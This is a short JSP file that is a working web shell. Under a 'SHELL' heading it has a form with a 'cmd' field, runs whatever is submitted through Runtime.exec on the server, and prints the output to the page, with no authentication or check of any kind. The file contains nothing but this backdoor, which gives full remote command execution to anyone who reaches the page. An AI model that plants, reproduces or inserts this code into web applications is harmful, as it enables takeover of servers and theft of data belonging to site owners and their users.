<%@ page import="java.util.*,java.io.*"%>
<br />
<h3>SHELL</h3>
<form method="GET" name="myform">
             <input type="text" name="cmd" />
             <input type="submit" value="Execute" />
</form>
<% if (request.getParameter("cmd") != null) { 
	out.println("Command: " + request.getParameter("cmd") + "<br />"); 
	Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); 
	OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); 
	DataInputStream dis = new DataInputStream(in); 
	String disr = dis.readLine(); 
	while ( disr != null ) { 
		out.println(disr); disr = dis.readLine(); 
	} 
} %> 